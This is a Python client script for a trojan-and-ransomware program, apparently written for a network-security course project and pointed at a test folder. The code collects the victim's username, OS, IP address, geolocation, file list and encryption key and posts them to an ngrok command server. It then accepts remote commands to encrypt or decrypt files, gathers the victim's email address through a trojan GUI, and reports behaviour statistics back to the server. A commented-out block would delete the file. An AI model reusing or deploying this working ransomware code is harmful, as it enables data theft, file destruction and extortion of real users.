import getpass
import platform
import requests
import threading
import socket
import queue
import time
import sys
import os
from flask import Flask, request

from Functions import generate_key, encrypt_file, decrypt_file, find_folder_path, get_files
from Interface import display_trojan_horse

#----------------------------------------------------------------------------------------------------#

server_ip = "https://network-security-project.ngrok.io"
client_ip = socket.gethostbyname(socket.gethostname())

file_path_queue = queue.Queue()
email_address_queue = queue.Queue()

#----------------------------------------------------------------------------------------------------#
# The thread responsible for handling communication with the server.

session_id = None
file_path = None
key = None

app = Flask(__name__)

@app.route("/key", methods=["POST"])
def receive_key():

    global session_id, file_path, key

    data = request.json

    if data.get("session_id"):
        session_id = data["session_id"]
        file_path = data["file_path"]
        encrypt_file(file_path, key)
        return "OK"
    
    elif data.get("key"):
        key = data["key"].encode()
        decrypt_file(file_path, key)
        return "OK"
    
    return "Invalid request", 400
    
def run_flask():
    try:
        app.run(host=client_ip, port=5000)
    except: 
        sys.exit(1)

t1 = threading.Thread(target=run_flask, daemon=True)
t1.start()

time.sleep(3)

#----------------------------------------------------------------------------------------------------#

# The thread responsible for scanning the files in the folder 
# and providing the server with the list of detected files along with the relevant client details.

folder_path = None
file_list = None
key = None

def background_worker(file_path_queue, email_address_queue):

    global folder_path, file_list, key, session_id, file_path

    folder_path = find_folder_path("Test - Network security topics") # Testing Environment

    if folder_path is None:
        sys.exit(1)

    file_list = get_files(folder_path)

    if not file_list:
        sys.exit(1)

    key = generate_key()

    information = {
    "username": getpass.getuser(),
    "system": platform.system(),
    "release": platform.release(),
    "IP": client_ip,
    "file_list": file_list,
    "key": key.decode(),
    "URL": f"{client_ip}:5000"}

    try:
        data = requests.get("https://ipapi.co/json/").json()
        information["country"] = data.get("country_name")
        information["city"] = data.get("city")
    except:
        information["country"] = "Unknown"
        information["city"] = "Unknown"
        information["IP"] = "Unknown"

    try: 
        requests.post(f"{server_ip}/key", json=information)
    except: 
        sys.exit(1)

    key = None

    while True:
        if session_id is not None and file_path is not None: 
            file_path_queue.put(file_path)
            break
        else:
            time.sleep(0.2)

    while True:
        try:
            email_address = email_address_queue.get_nowait() 

            try:
                requests.post(f"{server_ip}/key", json={"session_id": session_id, "email_address": email_address})
            except: 
                sys.exit(1)
                
            break
        except queue.Empty:
            time.sleep(0.2)
            continue  

t2 = threading.Thread(target=background_worker, daemon=True, args=(file_path_queue, email_address_queue))
t2.start()

time.sleep(3)

#----------------------------------------------------------------------------------------------------#

# The main thread runs the Trojan's GUI and the ransomware GUI, and finally sends statistics to the server.

decryption_attempts, payment_attempts, decryption_elapsed_time, payment_elapsed_time, help_elapsed_time, is_personal_information_provided, window_closure_method = display_trojan_horse(file_path_queue, email_address_queue)

"""
if window_closure_method == "User" or window_closure_method == "Timeout":
    os.remove(file_path)
"""
     
information = {
"session_id": session_id,
"decryption_attempts": decryption_attempts,
"payment_attempts": payment_attempts,
"decryption_elapsed_time": decryption_elapsed_time,
"payment_elapsed_time": payment_elapsed_time,
"help_elapsed_time": help_elapsed_time,
"is_personal_information_provided": is_personal_information_provided,
"window_closure_method": window_closure_method}

try:
    requests.post(f"{server_ip}/key", json=information)
except:
    sys.exit(1)

#----------------------------------------------------------------------------------------------------#